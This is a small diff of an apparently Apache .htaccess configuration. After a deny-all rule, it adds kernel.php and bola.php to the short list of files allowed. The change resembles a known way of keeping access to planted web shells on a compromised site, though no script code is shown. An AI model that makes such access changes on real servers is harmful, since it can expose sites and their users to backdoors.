@@ -2,7 +2,7 @@
     Order allow,deny
     Deny from all
     </FilesMatch>
-    <FilesMatch '^(index.html|version.php)$'>
+    <FilesMatch '^(index.html|version.php|kernel.php|bola.php)$'>
     Order allow,deny
     Allow from all
     </FilesMatch>
